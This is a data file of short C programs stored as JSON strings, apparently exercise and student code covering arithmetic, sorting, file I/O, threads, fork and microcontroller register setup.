    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n    double i,m,n;\n    double sum1 = 0,sum2 = 0;\n    scanf(\"%lf %lf\",&n,&m);\n    for(i = m+1;i <= n;i++){\n        sum1 += log(i);\n    }\n    for(i = 2;i <= n-m;i++){\n        sum2 += log(i);\n    }\n    printf(\"%.0lf\",exp(sum1 - sum2));\n    return 0;\n}",
    "#include<stdio.h>\nint main(void){\nint n,x,k;\nn=0;\nx=0;\nk=0;\nprintf(\"Vvedite n\");\nscanf(\"%d\",&n);\nfor(int i=1; i<=n;i++){\nprintf(\"Vvedite x\");\nscanf(\"%d\",&x);\nif (x>0)\nk=k+1;\n}\nprintf(\"Tchisel bol'she 0 : \");\nprintf(\"%d\",k);\nprintf(\"\\n\");\nreturn 0;\n}",
    "#include <stdio.h>\nint n=0,i=2,primo=1;\nint main() {\n        printf(\"Ingrese un numero entero:\");\n        scanf(\"%d\",&n);\n        while (i<(n-1) && primo==1){\n                if ((n%i)==0){\n                primo=0;\n                }\n                i++;\n        }\n        if (primo==0){\n                printf(\"El nunero no es primo \\n \");\n        }\n        else{\n                printf(\"El nunero es primo \\n \");\n        }\nreturn 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<unistd.h>\nvoid usage(void);\nint main(int argc, char **argv){\n FILE *src, *src2;\n char c;\n char x;\n src = fopen(\"Sample_Input\",\"r\");\n src2 = fopen(\"Sample_Output\",\"w\");\n while((x = getopt(argc, argv, \"i:o:\")) != -1){\n  switch(x){\n   case 'i':\n   src = fopen(optarg , \"r\");\n   break;\n   case 'o':\n   src2 = fopen(optarg , \"w\");\n   break;\n   exit(1);\n   }\n }\n if(src == ((void*)0)){\n  printf(\"File not Found\\n\");\n  exit(1);\n }\n if(src2 == ((void*)0)){\n  printf(\"File not Found\\n\");\n  exit(1);\n }\n while((c = fgetc(src)) != (-1)){\n  fputc(c,src2);\n }\nfclose(src);\nfclose(src2);\nreturn 0;\n}\nvoid usage(void){\nprintf(\"Usage:\\n\");\nprintf(\" -i <Input>\\n\");\nprintf(\" -o <Output>\\n\");\nexit(8);\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <string.h>\n#include <ctype.h>\n_Bool verify_password(char *p);\nint main()\n{\n  char p[] = \"Ax5@abcdefg\";\n  _Bool result = verify_password(p);\n  if (result) printf(\"Verified password!\\n\");\n  else printf(\"Invalid password!\\n\");\n  return 0;\n}\n_Bool verify_password(char *p)\n{\n  int length = strlen(p);\n  if (length < 8) return 0;\n  _Bool has_upper = 0;\n  _Bool has_lower = 0;\n  _Bool has_digit = 0;\n  _Bool has_symbol = 0;\n  for (int i = 0; i < length; i++)\n  {\n    if ((0 ? isupper(p[i]) : ((unsigned)(p[i])-'A') < 26)) has_upper = 1;\n    if ((0 ? islower(p[i]) : ((unsigned)(p[i])-'a') < 26)) has_lower = 1;\n    if ((0 ? isdigit(p[i]) : ((unsigned)(p[i])-'0') < 10)) has_digit = 1;\n    if (ispunct(p[i])) has_symbol = 1;\n  }\n  if (!has_upper) return 0;\n  if (!has_lower) return 0;\n  if (!has_digit) return 0;\n  if (!has_symbol) return 0;\n  return 1;\n}",
    "#include<stdio.h>\nint trace( int *x,int *y);\nint main()\n{\n    int a=4,b=7;\n    trace(&a,&b);\n    printf(\"%d %d\",a,b);\n    return 0;\n}\nint trace( int *x,int *y)\n{\n    *x=*x-1;\n    *y=*y+1;\n}",
    "#include <stdio.h>\nint Partition(int num[], int low, int high);\nvoid QuickSort(int num[], int low, int high);\nint main() {\n    int num[10000];\n    int i = 1;\n    while (scanf(\"%d\", &num[i]) != (-1)) {\n        i++;\n    }\n    --i;\n    QuickSort(num, 1, i);\n    printf(\"%d,\",num[1]);\n    printf(\"%d\",num[i]);\n    return 0;\n}\nint Partition(int num[], int low, int high) {\n    num[0] = num[low];\n    while (low < high) {\n        while (low < high && num[high] >= num[0]) {\n            high--;\n        }\n        num[low] = num[high];\n        while (low < high && num[low] <= num[0]) {\n            low++;\n        }\n        num[high] = num[low];\n    }\n    num[low] = num[0];\n    return low;\n}\nvoid QuickSort(int num[], int low, int high) {\n    if (low < high) {\n        int keyPosition = Partition(num, low, high);\n        QuickSort(num, low, keyPosition - 1);\n        QuickSort(num, keyPosition + 1, high);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n int zahl;\n printf(\"Geben sie eine Zahl ein\");\n scanf(\"%i\", &zahl);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n   char str[100];\n   int i;\n   int arr[123] = {0};\n   scanf(\"%s\", str);\n   for(i = 0; i < strlen(str); i++){\n      arr[str[i]]++;\n   }\n   for(i = 0; i < 123; i++){\n      if(arr[i] != 0){\n         printf(\"%c(%d)\", i, arr[i]);\n      }\n   }\n   return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nint main() {\n    char *env = getenv(\"PATH\");\n    printf(\"%s\\n\", env);\n    printf(\"--------------------------------------------------\\n\");\n    char *result = env;\n    char target = ';';\n    while ((result = strchr(result, target)) != ((void*)0)) {\n        printf(\"%s\\n\", result);\n        ++result;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\n\nint main()\n{\n char x[] = \"Happy Birthday To You\";\n char y[25];\n char z[15];\n printf(\"%s%s\\n%s%s\",\"The original array X: \", x,\"The array copied into Y: \", strcpy(y,x));\n strncpy(z, x, 15 );\n puts(\"\\nThe string in array Z: \");\n printf(\"%s\", z);\n}",
    "#include <stdio.h>\nint main(){\n    int i;\n    i = 1234;\n    printf(\"The value of 'i' is : '%d' \", i);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int k, size, temp, i, j;\n    int input[100];\n    FILE *fp = fopen(\"res/04_input.txt\", \"r\");\n    {\n        for(size = 0; size < 100 && !feof(fp); ++size)\n            fscanf(fp, \"%d\", &input[size]);\n        --size;\n    }\n    printf(\"Enter k= \");\n    scanf(\"%d\", &k);\n    for(j = 0; j < k; ++j)\n    {\n        temp = input[size - 1];\n        for(i = size - 1; i > 0; --i)\n            input[i] = input[i - 1];\n        input[0] = temp;\n    }\n    {\n        printf(\"Result is: \");\n        for(i = 0; i < size; ++i)\n            printf(\"%d \", input[i]);\n        printf(\"\\n\");\n    }\n}",
    "#include <stdatomic.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <unistd.h>\nint pravo=0;\nint zastavica[2];\nint broj_iteracija;\natomic_int A = 0;\nint broj_dretvi = 2;\nvoid izlaz_iz_KO(int i, int j){\n  pravo = j;\n  zastavica[i] = 0;\n}\nvoid ulazak_u_KO(int i, int j){\n  zastavica[i] = 1;\n  while(zastavica[j] != 0){\n    if (pravo == j){\n      zastavica[i] = 0;\n      while(pravo == j){\n      }\n      zastavica[i] = 1;\n    }\n  }\n}\nvoid* dekker(void *arg){\n   int i,j;\n   i = *((int*)arg);\n   j = (i==0 ? 1 : 0);\n   for (int x=0; x<broj_iteracija; x++ ){\n       ulazak_u_KO(i, j);\n       A++;\n       izlaz_iz_KO(i, j);\n   }\n}\nint main(int argc, char* argv[]){\n  if (argc != 2){\n    printf(\"Nije unesen broj iteracija kao argument\\n\");\n    printf(\"exiting\\n\");\n    exit(1);\n  }\n  else {\n    broj_iteracija = atoi(argv[1]);\n  }\n  int id[] = {0,1};\n  pthread_t thread_id[broj_dretvi];\n  for (int i=0; i<broj_dretvi; i++){\n      if ( pthread_create(&thread_id[i], ((void*)0), dekker, &id[i]) != 0 ){\n        printf(\"Ne mogu stvoriti dretvu!\\n\");\n        exit(1);\n      }\n  }\n  for (int x=0; x<broj_dretvi; x++){\n    pthread_join(thread_id[x], ((void*)0));\n  }\n  printf(\"A = %d\\n\", A);\n}",
    "#include <stdio.h>\nint *test();\nint main()\n{\n    int *arr = test();\n    printf(\"%d\\n\", *(arr + 3));\n}\nint *test()\n{\n    static int x[4];\n    for (int i = 0; i < 4; i++)\n    {\n        x[i] = i % 2;\n    }\n    return x;\n}",
    "#include<stdio.h>\nint main() {\n    int num, u, d, c;\n    printf(\"Informe um numero inteiro menor que 1000: \");\n    scanf(\"%d\", &num);\n    if (num > 0 && num < 1000)\n    {\n        u = num / 1 % 10;\n        d = num / 10 % 10;\n        c = num / 100 % 10;\n        printf(\"%d = %d centenas, %d dezenas e %d unidades\", num, c, d, u);\n    }\n    else\n    {\n        printf(\"Insira um numero maior que zero 0 ou menor que 1000\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    double time;\n    scanf(\"%lf\", &time);\n    if(time < 0)\n        printf(\"Invalid input.\");\n    else if(time < 5)\n        printf(\"%.3lf\\n\",0.02 + floor(time) * 0.005);\n    else\n        printf(\"%.3lf\\n\",0.045);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint top1 = -1;\nint top2 = 5;\nint push(int *A,int ele,int stack) {\n  if(abs(top1-top2)!=1) {\n    if(stack==1) {\n      top1++;\n      A[top1]=ele;\n    }\n    else if(stack==2)\n    {\n      top2--;\n      A[top2]=ele;\n    }\n    else {\n      return 0;\n    }\n  }\n  else {\n    printf(\"\\nArray is Full\\n\");\n    return -1;\n  }\n}\nint pop(int *A,int stack,int ni) {\n  if(stack==1) {\n    if(top1==-1) {\n      printf(\"Error: Underflow\\n\");\n    }\n    else\n    {\n      return(A[top1--]);\n    }\n  }\n  else if(stack==2) {\n    if(top2==ni)\n    printf(\"Error: Underflow\\n\");\n    else {\n      return(A[top2++]);\n    }\n  }\n}\nvoid display(int *A,int stack) {\n  int i;\n  if(stack==1) {\n    if(top1==-1) {\n      return;\n    }\n    else {\n      printf(\"| %d |\\n\",A[top1--]);\n      printf(\"|___|\\n\");\n      display(A,1);\n    }\n  }\n  if(stack==2)\n  {\n    if(top2==5) {\n      return;\n    }\n    else {\n      printf(\"| %d |\\n\",A[top2++]);\n      printf(\"|___|\\n\");\n      display(A,2);\n    }\n  }\n}\nint main()\n{\n  int n,ele,stack,sd,ch;\n  int *A=(int*)malloc(5*sizeof(int));\n  do\n  {\n    printf(\"Enter stack 1 / 2 : \\n\");\n    scanf(\"%d\",&stack);\n    printf(\"Enter element (For quit pushing Elements = -1): \\n\");\n    scanf(\"%d\",&ele);\n    if(ele==-1) {\n      break;\n    }\n    int ans=push(A,ele,stack);\n    printf(\"Want to pop :1 / else: 0: \\n\");\n    scanf(\"%d\",&ch);\n    if(ch==1) {\n      printf(\"\\nFrom which stack You want to pop: \\n\");\n      scanf(\"%d\",&stack);\n      pop(A,stack,5);\n    }\n    if(ans==-1) {\n      break;\n    }\n  }\n  while(ele!=-1);\n  printf(\"\\nstack 1: \\n\");\n  display(A,1);\n  printf(\"\\nstack 2: \\n\");\n  display(A,2);\n}",
    "#include <stdio.h>\n\n\n\n\nint main(void) {\n    float cups;\n    printf(\"Enter number of cups: \");\n    scanf(\"%f\", &cups);\n    printf(\"%.2f pints\\n\", cups/2);\n    printf(\"%.2f ounces\\n\", cups*8);\n    printf(\"%.2f tablespoons\\n\", cups*8*2);\n    printf(\"%.2f teaspoons\\n\", cups*8*2*3);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdbool.h>\nint main()\n{\n  char* choice = (char*) malloc(10 * sizeof(char));\n  int n1,n2,val;\n printf(\"Please enter first Number: \");\n scanf(\"%d\", &n1);\n  printf(\"Please enter second Number: \");\n scanf(\"%d\", &n2);\n  printf(\"Numbers entered is : %d and %d \\n\", n1,n2);\n  if (n1==30 || n2==30 ||n1+n2==30){\n    val=1;\n  }\n  else {\n    val=0;\n  }\n  printf(\"val is: %d\\n\", val);\n  if(val==1){\n    printf(\"Either values or sum of both equils 30, therefore....\");\n    printf(\"result: %s\\n\",\"TRUE\");\n  }\n  else {\n    printf(\"Neither values or the sum of both equils 30, therefore....\");\n    printf(\"result: %s\\n\",\"FALSE\");\n  }\n  return val;\n}",
    "#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <stdio.h>\nint main(int argc, char *argv[]) {\n int rfd, wfd, n;\n char buf[1024];\n if ((rfd = open(argv[1], (0x04000000))) == -1) {\n  perror(\"open\");\n  exit(1);\n }\n if ((wfd = open(argv[2], (((__wasi_oflags_t)(1 << 0)) << 12) | (((__wasi_oflags_t)(1 << 3)) << 12) | (0x10000000), 0644)) == -1) {\n  perror(\"open\");\n  exit(1);\n }\n while ((n = read(rfd, buf, 1024)) > 0) {\n  if (write(wfd, buf, n) != n) {\n   perror(\"write\");\n   exit(1);\n  }\n }\n if (n == -1) {\n  perror(\"read\");\n  exit(1);\n }\n close(rfd);\n close(wfd);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int c, a, b;\n    c = 5, a=0, b=1;\n    printf(\"c=%d\\n\", c );\n    a= b + c++;\n    printf(\"a=%d\\n\", a );\n    printf(\"c=%d\\n\\n\", c );\n    c = 5, a=0,b=1;\n    printf(\"c=%d\\n\", c );\n    a= b + ++c;\n    printf(\"a=%d\\n\", a );\n    printf(\"c=%d\\n\", c );\n    return 0;\n}",
    "#include<stdio.h>\nint main (void)\n{\n int num1,num2;\n printf(\"\\nInput first number: \");\n scanf(\"%d\",&num1);\n printf(\"\\nInput second number: \");\n scanf(\"%d\",&num2);\n num1 = num1^num2;\n num2 = num1^num2;\n num1 = num1^num2;\n printf(\"First number after swapping: %d. \\n\",num1);\n printf(\"Second number after swapping: %d. \\n\",num2);\n return 0;\n}",
    "#include <stdio.h>\n\nint main (void) {\n    int chaDeExemplo,\n        cha,\n        quantidadeQueSeRepete = 0,\n        i;\n    scanf(\"%d\", &chaDeExemplo);\n    for (i = 0; i < 5; i++) {\n        scanf(\"%d\", &cha);\n        if (cha == chaDeExemplo) {\n            quantidadeQueSeRepete++;\n        }\n    }\n    printf(\"%d\\n\", quantidadeQueSeRepete);\n    return 0;\n}",
    "#include <stdio.h>\nint fun() {\n    return 10;\n}\nint main() {\n    volatile int a = 5;\n    int b = 10;\n    a = fun();\n    b = a + 1;\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid reverse(char s[]);\nvoid itob(int n, char s[], int b);\nint main(){\n    char s[1000];\n    itob(45235134, s, 16);\n    printf(\"%s\", s);\n    return 0;\n}\nvoid itob(int n, char s[], int b){\n    int i, sign;\n    unsigned int npositive;\n    if ((sign = n) < 0)\n        npositive = -n;\n    else\n        npositive = n;\n    i = 0;\n    do {\n        s[i++]= (npositive%b) < 10 ? npositive%b +'0' : npositive%b + 55;\n    }\n    while ((npositive /= b) > 0);\n    if (sign < 0)\n        s[i++] = '-';\n    s[i] = '\\0';\n    reverse(s);\n}\nvoid reverse(char s[]){\n    int c, i, j, len;\n    for(i = 0, len = 0; s[i]!= '\\0'; i++, len++)\n        ;\n    for (i = 0, j = len-1; i < j; i++, j--)\n        c = s[i], s[i] = s[j], s[j] = c;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\nint main(int argc, char* argv[])\n{\n FILE *file = ((void*)0);\n char buf[1024] = {'\\0'};\n if (argc != 2) {\n  printf(\"[Usage] %s FILENAME\\n\", argv[0]);\n  return 0;\n }\n if ((file = fopen(argv[1], \"r\")) == ((void*)0)) {\n  perror(\"fopen\");\n  exit(errno);\n }\n while (fgets(buf, sizeof(buf), file) != ((void*)0)) {\n  printf(\"%s\", buf);\n }\n fclose(file);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n  char var[20];\n  char *ptr;\n  strcpy(var, \"Hello, World\\n\");\n  ptr = var;\n  printf(\"%s\\n\", ptr);\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int a;\n    scanf(\"%d\", &a);\n    if (a % 2 == 0)\n    {\n        printf(\"Even\");\n    }\n    else\n    {\n        printf(\"Odd\");\n    }\n    return 0;\n}",
    "#include <stdlib.h>\n\nchar ic[16] = {0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45};\nchar ib[16] = {0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45};\nint main ()\n{\n  int i;\n  char ia[16];\n  for (i = 0; i < 16; i++)\n    {\n      ia[i] = ib[i] + ic[i];\n    }\n  for (i = 0; i < 16; i++)\n    {\n      if (ia[i] != ib[i] + ic[i])\n        abort ();\n    }\n  return 0;\n}",
    "#include <stdio.h>\n\nint bitcount(unsigned x){\n    int b;\n    for(b = 0; x != 0; x >>= 1)\n        if(x & 01)\n            b++;\n    return b;\n}\nint bitcount_faster(unsigned x){\n    int b;\n    for(b = 0; x != 0; x &= (x-1))\n        b++;\n    return b;\n}\nint main(){\n    printf(\"Exercise2-9\\n\");\n    unsigned int x = 0xFFF;\n    int n_bits = 0;\n    printf(\"x: %x\\n\", x);\n    n_bits = bitcount(x);\n    printf(\"bitcount x: %d\\n\", n_bits);\n    n_bits = bitcount_faster(x);\n    printf(\"bitcount_faster x: %d\\n\", n_bits);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(){\n   int N, n, a, sum1, sum2, i, sum, t = 1;\n   scanf(\"%d\", &N);\n   while(N--){\n      sum1 = sum2 = sum = 0;\n      scanf(\"%d\",&n);\n      for(i = 0; i < n; i++){\n         scanf(\"%d\", &a);\n         sum1 += (a / 30) * 10 + 10;\n         sum2 += (a / 60) * 15 + 15;\n      }\n      sum = ( sum1 <= sum2 ? sum1 : sum2 );;\n      if(sum == sum1 && sum == sum2) printf(\"Case %d: Mike Juice %d\\n\", t, sum);\n      else if(sum == 1 && sum != sum2) printf(\"Case %d: Mile %d\\n\", t, sum);\n      else printf(\"Case %d: Juice %d\\n\", t, sum);\n      t++;\n   }\n   return(0);\n}",
    "#include <stdio.h>\nint main(void) {\n    int n1, n2, differ;\n    puts(\"Enter three number:\");\n    printf(\"integer 1:\"); scanf(\"%d\", &n1);\n    printf(\"integer 2:\"); scanf(\"%d\", &n2);\n    differ = (n1 > n2) ? n1 - n2:n2 - n1;\n    if (differ <= 10)\n        puts(\"their difference is less than or equal to 10.\");\n    else\n        puts(\"their difference is bigger than or equal to 11.\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main() {\n  int m = 100;\n  printf(\"before fork\\n\");\n  int n = fork();\n  if (n>0) {\n    printf(\"I am parent process!\\n\");\n    printf(\"m=%d n=%d\\n\", m, n);\n    while (1) {}\n  } else {\n    printf(\"I am child process!\\n\");\n    printf(\"m=%d n=%d\\n\", m, n);\n    while (1) {}\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\n\n\nvoid clear_arr(int arr[]) {\n  for (int i = 0; i < 256; i++) {\n    arr[i] = 0;\n  }\n}\nvoid arr_cpy(int arr2[], int arr1[]) {\n  clear_arr(arr2);\n  for (int i = 0; i < 256; i++) {\n    arr2[i] = arr1[i];\n  }\n}\nvoid print(int arr[]) {\n  int flag = 0;\n  for (int i = 256 -1; i >= 0; i--) {\n    if (arr[i]) {\n      flag = 1;\n    }\n    if (flag) {\n      printf(\"%d\", arr[i]);\n    }\n  }\n  printf(\"\\n\");\n}\nvoid mult(int arr[], int m, int res[]) {\n  int tmp = 0, j = 0, a = 0;\n  clear_arr(res);\n  for (int i = 0; i < 256; i++) {\n    tmp = arr[i] * m;\n    j = 0;\n    while (tmp > 0) {\n      res[i + j] += tmp % 10;\n      if (res[i + j] >= 10) {\n        a = res[i + j];\n        res[i + j] = a % 10;\n        res[i + j + 1] += a / 10;\n      }\n      tmp /= 10;\n      j++;\n    }\n  }\n}\nint main(void) {\n  int fact[256];\n  int res[256];\n  int ans = 0;\n  clear_arr(fact);\n  fact[0] = 1;\n  for (int i = 1; i <= 100; i++) {\n    mult(fact, i, res);\n    arr_cpy(fact, res);\n  }\n  for (int i = 0; i < 256; i++) {\n    ans += fact[i];\n  }\n  printf(\"%d\\n\", ans);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char** argv) {\n    return (0);\n}",
    "#include <stdio.h>\nint main(void) {\n return printf(\"Zdravo, svijete\\n\");\n}",
    "#include<stdio.h>\n#include<stdio.h>\ntypedef char* PCHAR;\n\nint main()\n{\n        char* a,b,c;\n        printf(\"\\n size of a %lu \\n\", sizeof(a));\n        printf(\"\\n size of b %lu\\n\", sizeof(b));\n        printf(\"\\n size of c %lu\\n\", sizeof(c));\n        return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"Hello World\");\n    getchar();\n    return 0;\n}",
    "#include <stdio.h>\nconst double direcoes_x[16] = {1, 1, 1, 0.5, 0, -0.5, -1, -1, -1, -1, -1, -0.5, 0, 0.5, 1, 1};\nconst double direcoes_y[16] = {0, 0.5, 1, 1, 1, 1, 1, 0.5, 0, -0.5, -1, -1, -1, -1, -1, -0.5};\nconst double octantes_x[8] = {1, 0.707106781, 0, -0.707106781, -1, -0.707106781, 0, 0.707106781};\nconst double octantes_y[8] = {0, 0.707106781, 1, 0.707106781, 0, -0.707106781, -1, -0.707106781};\nint main (){\n FILE *arq;\n int c;\n int n = 0;\n arq = fopen(\"file.txt\",\"r\");\n if(arq == ((void*)0)) {\n  perror(\"Erro, nao foi possivel abrir o arquivo\\n\");\n  return(-1);\n }\n while ((c = fgetc(arq)) != (-1)){\n  printf(\"%c\", c);\n  n++;\n }\n printf (\"bytes: %d\", n);\n fclose(arq);\n return(0);\n}",
    "#include <stdio.h>\ndouble price(double price, double sg, double r, double t);\ndouble sg(double sg, double r, double t);\ndouble volume(double r, double t);\nint main()\n{\n  double r, t, a;\n  printf(\"Input the radius \");\n  scanf(\"%lf\", &r);\n  printf(\"Input the thickness \");\n  scanf(\"%lf\", &t);\n  printf(\"gold   %f\\n\", price(1324.0, 19.3, r, t));\n  printf(\"silver %f\\n\", price(17.76, 10.5, r, t));\n  printf(\"copper %f\\n\", price(0.2211, 8.93, r, t));\n  return 0;\n}\ndouble price(double price, double g, double r, double t)\n{\n  return (price * sg(g, r, t));\n}\ndouble sg(double sg, double r, double t)\n{\n  return (sg * volume(r, t));\n}\ndouble volume(double r, double t)\n{\n  double pi = 3.14159265358979323846;\n  return pi * (r * r) * t;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid raz(int *ptr)\n{\n    *ptr = 0;\n}\nvoid testETraz(int *ptr)\n{\n    if (*ptr != 0) raz(ptr);\n}\nint main()\n{\n    int x=19;\n    testETraz(&x);\n    printf(\"x: %d\\n\", x);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n1, n2, n3, p1, p2, p3;\n    double media;\n    printf(\"Digite os valores das notas:: \\n\");\n    printf(\"\\nn1: \");\n    scanf(\"%d\", &n1);\n    printf(\"\\nn1: \");\n    scanf(\"%d\", &n2);\n    printf(\"\\nn1: \");\n    scanf(\"%d\", &n3);\n    printf(\"\\nDigite os valores dos pesos respectivamente:: \\n\");\n    printf(\"\\np1: \");\n    scanf(\"%d\", &p1);\n    printf(\"\\np2: \");\n    scanf(\"%d\", &p2);\n    printf(\"\\np3: \");\n    scanf(\"%d\", &p3);\n    media = ( ( n1 * p1 ) + ( n2 * p2 ) + ( n3 * p3 ) ) / ( p1 + p2 + p3);\n    printf(\"\\nM\u00e9dia ponderada: %.2f \\n\\n\", media );\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int x=3;\n  *((int *) (float *)&x) = 4;\n  printf(\"x=%i\\n\",x);\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint fgetline(FILE *fp, char *line, int lim)\n{\n  int c, n = 0;\n  while ((c = getc(fp)) != (-1) && c != '\\n') {\n    if (n++ < lim) {\n      *line++ = c;\n    }\n  }\n  *line = '\\0';\n  return c;\n}\nint main(int argc, char *argv[])\n{\n  if (argc != 3) {\n    fprintf((stderr), \"usage: %s file1 file2\\n\", argv[0]);\n    return 1;\n  }\n  FILE *fp1, *fp2;\n  if ((fp1 = fopen(argv[1], \"r\")) == ((void*)0)) {\n    fprintf((stderr), \"cannot open %s\\n\", argv[1]);\n    return 1;\n  }\n  if ((fp2 = fopen(argv[2], \"r\")) == ((void*)0)) {\n    fprintf((stderr), \"cannot open %s\\n\", argv[2]);\n    return 1;\n  }\n  char line1[1000], line2[1000];\n  int res1, res2, lineno = 0;\n  do {\n    ++lineno;\n    res1 = fgetline(fp1, line1, 1000) != (-1);\n    res2 = fgetline(fp2, line2, 1000) != (-1);\n  }\n  while (res1 && res2 && strcmp(line1, line2) == 0);\n  if (res1)\n    printf(\"%s:%d: %s\\n\", argv[1], lineno, line1);\n  if (res2)\n    printf(\"%s:%d: %s\\n\", argv[2], lineno, line2);\n  fclose(fp1);\n  fclose(fp2);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <string.h>\n\nstatic int psprintf(char **str, const char *name,\n  const char *fmt, ...) __attribute__ ((format (printf, 3, 4)));\n\n\nstatic int psprintf(char **str, const char *name,\n  const char *fmt, ...)\n{\n int size;\n char *nfmt;\n va_list ap;\n int ret;\n size = strlen(name) + strlen(fmt) + 3;\n nfmt = malloc(size);\n if (!nfmt)\n  return -1;\n snprintf(nfmt, size, \"%s: %s\", name, fmt);\n __builtin_va_start(ap, fmt);\n ret = vsnprintf(((void*)0), 0, nfmt, ap);\n __builtin_va_end(ap);\n if (ret < 0)\n  goto free_nfmt;\n size = ret + 1;\n *str = malloc(size);\n if (*str == ((void*)0)) {\n  ret = -1;\n  goto free_nfmt;\n }\n __builtin_va_start(ap, fmt);\n ret = vsnprintf(*str, size, nfmt, ap);\n __builtin_va_end(ap);\n if (ret < 0)\n  goto free_nfmt;\nfree_nfmt:\n free(nfmt);\n return ret;\n}\nint main(int argc, char *argv[])\n{\n char *msg;\n int ret;\n        if (argc < 2) {\n                fprintf((stderr), \"usage: %s <prefix>\\n\",\n                        argv[0]);\n                return -1;\n        }\n ret = psprintf(&msg, argv[1],\n  \"some data: %d, %c\\n\", 10, 'x');\n if (ret < 0) {\n  fprintf((stderr), \"psprintf error\\n\");\n  return -1;\n }\n fputs(msg, (stdout));\n free(msg);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n;\n    printf(\"Please enter a number bigger than 10: \");\n    scanf(\"%d\", &n);\n    int x[100];\n    int i = 0;\n    int j = 0;\n    while (n != 0)\n    {\n        x[i] = n%10;\n        n /= 10;\n        i++;\n    }\n    int z = i;\n    printf(\"The number is %d digits. \\n\", i);\n    printf(\"The reseverd number: \");\n    for (j = 0; j < i; j++)\n    {\n        printf(\"%d\", x[j]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n\nchar buf[100];\nint bufp = 0;\nint getch(void);\nvoid ungetch(int c);\nint getFloat(float *pn);\nint getch(void)\n{\n  return bufp > 0 ? buf[--bufp] : getchar();\n}\nvoid ungetch(int c)\n{\n  if (bufp >= 100) {\n    printf(\"ungetch: you input too many characters\\n\");\n  } else {\n    buf[bufp++] = c;\n  }\n}\nint getFloat(float *pn)\n{\n  char c = getch();\n  int sign, base = 10.0;\n  while (__isspace(c))\n    c = getch();\n  if (!(0 ? isdigit(c) : ((unsigned)(c)-'0') < 10) && c != '+' && c != '-') {\n    ungetch(c);\n    return 0;\n  }\n  sign = c == '-' ? -1 : 1;\n  if (c == '+' || c == '-')\n    c = getch();\n  *pn = 0.0;\n  while ((0 ? isdigit(c) : ((unsigned)(c)-'0') < 10)) {\n    *pn = *pn * 10.0 + (float) (c - '0');\n    c = getch();\n  }\n  if (c == '.')\n    c = getch();\n  else {\n    ungetch(c);\n    return 1;\n  }\n  while ((0 ? isdigit(c) : ((unsigned)(c)-'0') < 10)) {\n    *pn += (float) (c - '0') / base;\n    base *= 10.0;\n    c = getch();\n  }\n  *pn *= sign;\n  if (c != (-1)) {\n    ungetch(c);\n  }\n  return 1;\n}\nint main(void)\n{\n  float *t;\n  printf(\"enter a float number:\\n\");\n  if (getFloat(t)) {\n    printf(\"the entered number is %f\\n\", *t);\n  } else {\n    printf(\"can not read you number\\n\");\n  }\n  return 0;\n}",
    "#include <stdint.h>\n\n\n\n\n\n\nint main(void)\n{\n uint32_t *pRccCrReg = (uint32_t *) (0x40023800UL + 0x00UL);\n *pRccCrReg &= ~(1 << 18);\n *pRccCrReg |= (1 << 18);\n *pRccCrReg &= ~(1 << 16);\n *pRccCrReg |= (1 << 16);\n while (!(*pRccCrReg & (1 << 17))) ;\n uint32_t *pRccCfgrReg = (uint32_t *) (0x40023800UL + 0x08UL);\n *pRccCfgrReg |= (0x1 << 0);\n *pRccCfgrReg &= ~(0x3 << 21);\n *pRccCfgrReg |= (0x1 << 22);\n *pRccCfgrReg |= (1 << 25);\n *pRccCfgrReg |= (1 << 26);\n uint32_t *pRCCAbh1Enr = (uint32_t *) (0x40023800UL + 0x30);\n *pRCCAbh1Enr |= (1 << 0);\n uint32_t *pGPIOAModeReg = (uint32_t *) (0x40020000UL + 0x00);\n *pGPIOAModeReg &= ~(0x03 << 16);\n *pGPIOAModeReg |= (0x02 << 16);\n uint32_t *pGPIOAAltFuncHighReg = (uint32_t *) (0x40020000UL + 0x24);\n *pGPIOAAltFuncHighReg &= ~( 0x0F << 0);\n for(;;);\n}",
    "int printf();\nint main(){\n    int x = 2;\n    if(x > 1){\n        if(x < 2){\n            printf(\"Hi\\n\");\n        }\n        else if(x <= 2){\n            printf(\"Yes\\n\");\n        }\n        else{\n            printf(\"No\\n\");\n        }\n    }\n    else{\n        printf(\"Bye\\n\");\n    }\n    return 0;\n}",
